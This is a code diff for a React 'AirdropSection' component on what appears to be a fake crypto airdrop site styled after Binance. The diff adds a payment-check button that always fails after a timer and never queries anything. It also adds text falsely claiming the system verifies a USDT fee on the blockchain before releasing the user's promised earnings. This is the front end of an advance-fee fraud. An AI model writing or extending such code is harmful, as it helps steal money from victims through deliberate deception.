@@ -70,6 +70,17 @@ const AirdropSection = () => {
     setIsLoading(false);
   };
 
+  // Check payment verification
+  const checkPaymentVerification = async () => {
+    setIsLoading(true);
+    toast.loading('🔍 Checking payment verification...', { duration: 3000 });
+    
+    setTimeout(() => {
+      setIsLoading(false);
+      toast.error('❌ Payment not confirmed yet. Please wait 5-10 minutes after sending USDT.', { duration: 5000 });
+    }, 3000);
+  };
+
   return (
     <section id="airdrop" className="py-12 md:py-20 px-4">
       <div className="container mx-auto">
@@ -482,16 +493,37 @@ const AirdropSection = () => {
                       This helps us distinguish between real users and automated bots. Once verified, your ${earnings.toLocaleString()} USDT will be instantly released to your wallet.
                     </p>
                   </div>
+
+                  <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3 mb-6">
+                    <div className="flex items-center space-x-2 mb-2">
+                      <span className="text-blue-400 text-lg">💡</span>
+                      <span className="text-blue-400 font-semibold">After sending payment:</span>
+                    </div>
+                    <p className="text-xs text-binance-light-gray">
+                      Click the button below to verify your payment. Our system will check the blockchain and confirm your ${FEE_AMOUNT} USDT transaction. If verified, your ${earnings.toLocaleString()} USDT will be automatically transferred to your wallet.
+                    </p>
+                  </div>
                 </motion.div>
 
                 <motion.button
-                  onClick={resetSystem}
-                  className="w-full bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-xl transition-all"
+                  onClick={checkPaymentVerification}
+                  disabled={isLoading}
+                  className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 px-6 rounded-xl transition-all disabled:opacity-50"
                   initial={{ opacity: 0 }}
                   animate={{ opacity: 1 }}
                   transition={{ duration: 0.5, delay: 0.6 }}
                 >
-                  Try Again
+                  {isLoading ? (
+                    <div className="flex items-center justify-center space-x-2">
+                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
+                      <span>Checking...</span>
+                    </div>
+                  ) : (
+                    <div className="flex items-center justify-center space-x-2">
+                      <span>🔍</span>
+                      <span>I sent the fee - Check my payment</span>
+                    </div>
+                  )}
                 </motion.button>
               </div>
             )}
